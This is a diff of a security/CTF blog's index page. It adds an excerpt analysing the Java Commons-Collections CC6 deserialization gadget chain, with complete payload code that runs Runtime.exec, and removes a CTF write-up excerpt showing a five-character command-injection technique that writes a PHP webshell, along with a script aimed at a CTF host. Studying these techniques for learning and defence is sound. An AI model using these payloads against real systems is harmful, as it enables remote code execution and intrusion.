@@ -131,6 +131,54 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/11/03/JAVA反序列化CC6/" >JAVA反序列化CC6</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-11-03
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="JAVA反序列化CC6"><a href="#JAVA反序列化CC6" class="headerlink" title="JAVA反序列化CC6"></a>JAVA反序列化CC6</h1><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1yP4y1p7N7/?share_source=copy_web&vd_source=515182f812086f458c10553996fb6c65">Java反序列化CommonsCollections篇(二)-最好用的CC链</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java</a></p>
+</blockquote>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>同CC1</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>跟CC1一样  追踪transform的使用</p>
+<p>跟踪到<code>LazyMap.get</code> </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line"><span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再到<code>TiedMapEntry.hashCode</code>  很明显这里我们又可以利用 HashMap了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);	<span class="comment">// 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();	<span class="comment">// 2</span></span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>HashMap readObject中会对key调用hashCode方法</p>
+<h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><ul>
+<li>构造HashMap 其中key放一个TiedMapEntry </li>
+<li>这里TiedMapEntry 里的map放LazyMap，key可以随便</li>
+<li>LazyMap 的构造可以用到ChainedTransform</li>
+</ul>
+<p>要注意的是<code>LazyMap.get</code> 中当key不存在时才会调用transform方法  然后会put key到map中</p>
+<p>因为序列化时就会调用hashCode触发这条链  所以序列化之后要把key从map中移除</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        HashMap.readObject()</span></span><br><span class="line"><span class="comment">            TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                LazyMap.get()</span></span><br><span class="line"><span class="comment">                    ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; o = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        o.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="comment">//        serializeTest(o);</span></span><br><span class="line">        unSerializeTest();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeTest</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unSerializeTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/2023/11/03/JAVA反序列化CC6/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/10/25/HDCTF2023-YamiYami-wp/" >HDCTF2023-YamiYami-wp</a>
 								</h3>
 							</div>
@@ -702,47 +750,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/10/07/UUCTF2022-ezrce-wp/" >UUCTF2022-ezrce-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-10-07
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3051">题目链接</a>   </p>
-<p>输入command，提交后跳转到post.php<br>POST cmd尝试多次发现命令最长长度只能为6   成功执行会提示在<code>./tmp/</code>下成功执行<br>虽然有的情况下提示执行失败，但实际上是执行了的    所以回显不一定可信</p>
-<h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">nl</span>		<span class="comment"># 创建一个名为nl的文件</span></span><br><span class="line">* /*&gt;a	<span class="comment"># 第一个*相当于将ls的第一个输出作为命令  剩下的作为参数来执行   即	nl /*&gt;a</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><p>前置知识</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;file	<span class="comment"># 生成名为file的文件</span></span><br><span class="line">*&gt;a		<span class="comment"># 将ls的第一个输出作为命令  剩下的作为参数来执行</span></span><br><span class="line">sh a	<span class="comment"># 将文件内容作为命令执行</span></span><br><span class="line"><span class="comment"># 换行执行命令：</span></span><br><span class="line">ech\</span><br><span class="line">o\</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure>
-
-<p>例（空文件夹下）</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">dir</span></span><br><span class="line">&gt;sl</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;f\&gt;</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="comment"># dir  &#x27;f&gt;&#x27;   ht-   sl</span></span><br><span class="line">*&gt;v</span><br><span class="line"><span class="comment"># v: f&gt;  ht-  sl</span></span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;0</span><br><span class="line"><span class="comment"># 0: ls  -th  &gt;f</span></span><br><span class="line">sh 0</span><br><span class="line"><span class="built_in">cat</span> f</span><br><span class="line"><span class="comment"># 0 rev v ....</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5字符RCE写木马脚本"><a href="#5字符RCE写木马脚本" class="headerlink" title="5字符RCE写木马脚本"></a>5字符RCE写木马脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://node5.anna.nssctf.cn:28362/post.php&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;5字符RCE.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;i.strip()&#125;</span>&quot;</span>&#125;</span><br><span class="line">        requests.post(url=url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>字符RCE.txt（写入<span class="number">1.</span>php 木马GET[<span class="number">1</span>]）</span><br><span class="line">&gt;<span class="built_in">dir</span></span><br><span class="line">&gt;sl</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;<span class="number">0</span></span><br><span class="line">&gt;hp</span><br><span class="line">&gt;<span class="number">1.</span>p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;<span class="number">7</span>\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">sh <span class="number">0</span></span><br><span class="line">sh f</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/<span class="number">1</span>.php?<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/10/07/UUCTF2022-ezrce-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -792,6 +799,8 @@
 		
 			<li><a href="/categories/CVE/">CVE<span>12</span></a></li>
 		
+			<li><a href="/categories/Java/">Java<span>1</span></a></li>
+		
 			<li><a href="/categories/fuzz/">fuzz<span>2</span></a></li>
 		
 			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
@@ -815,45 +824,45 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/stack/">stack<span>10</span></a></li>
+			<li><a href="/tags/md5/">md5<span>1</span></a></li>
 		
-			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
+			<li><a href="/tags/nightmare/">nightmare<span>11</span></a></li>
 		
-			<li><a href="/tags/bypass/">bypass<span>5</span></a></li>
+			<li><a href="/tags/heap-overflow/">heap_overflow<span>1</span></a></li>
 		
-			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
+			<li><a href="/tags/seccon2019/">seccon2019<span>1</span></a></li>
 		
-			<li><a href="/tags/fuzz/">fuzz<span>6</span></a></li>
+			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
 		
-			<li><a href="/tags/SROP/">SROP<span>2</span></a></li>
+			<li><a href="/tags/nodejs/">nodejs<span>5</span></a></li>
 		
-			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
+			<li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li>
 		
-			<li><a href="/tags/malloc-hook/">__malloc_hook<span>1</span></a></li>
+			<li><a href="/tags/Backdoorctf/">Backdoorctf<span>1</span></a></li>
 		
-			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>3</span></a></li>
+			<li><a href="/tags/rce/">rce<span>19</span></a></li>
 		
-			<li><a href="/tags/ciscn2023/">ciscn2023<span>4</span></a></li>
+			<li><a href="/tags/深育杯2021/">深育杯2021<span>1</span></a></li>
 		
-			<li><a href="/tags/无参函数构造rce/">无参函数构造rce<span>2</span></a></li>
+			<li><a href="/tags/AFL/">AFL<span>2</span></a></li>
 		
-			<li><a href="/tags/nssctf/">nssctf<span>60</span></a></li>
+			<li><a href="/tags/De1ctf2019/">De1ctf2019<span>1</span></a></li>
 		
-			<li><a href="/tags/ret2syscall/">ret2syscall<span>2</span></a></li>
+			<li><a href="/tags/flask-session/">flask session<span>3</span></a></li>
 		
-			<li><a href="/tags/Backdoorctf2017/">Backdoorctf2017<span>1</span></a></li>
+			<li><a href="/tags/heap/">heap<span>4</span></a></li>
 		
-			<li><a href="/tags/web/">web<span>72</span></a></li>
+			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
 		
-			<li><a href="/tags/二进制插桩/">二进制插桩<span>2</span></a></li>
+			<li><a href="/tags/sha1/">sha1<span>1</span></a></li>
 		
-			<li><a href="/tags/GKCTF2021/">GKCTF2021<span>1</span></a></li>
+			<li><a href="/tags/js/">js<span>1</span></a></li>
 		
-			<li><a href="/tags/jwt/">jwt<span>1</span></a></li>
+			<li><a href="/tags/XCTFQuals2016/">XCTFQuals2016<span>1</span></a></li>
 		
-			<li><a href="/tags/SwampCTF2019/">SwampCTF2019<span>1</span></a></li>
+			<li><a href="/tags/二次编码绕过/">二次编码绕过<span>1</span></a></li>
 		
-			<li><a href="/tags/HDCTF2023/">HDCTF2023<span>5</span></a></li>
+			<li><a href="/tags/dcquals2019/">dcquals2019<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>129</span></a></li>
@@ -869,6 +878,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2024/02/13/J-Mybatis/" ><i class="fa fa-file-o"></i>mybatis学习</a>
+      </li>
+    
+      <li>
         <a href="/2024/01/24/CISCN2023-DeserBug-wp/" ><i class="fa fa-file-o"></i>CISCN2023-DeserBug-wp</a>
       </li>
     
@@ -882,10 +895,6 @@
     
       <li>
         <a href="/2024/01/16/JNDI注入/" ><i class="fa fa-file-o"></i>JNDI注入</a>
-      </li>
-    
-      <li>
-        <a href="/2024/01/13/JDBC反序列化/" ><i class="fa fa-file-o"></i>JDBC反序列化</a>
       </li>
     
   </ul>
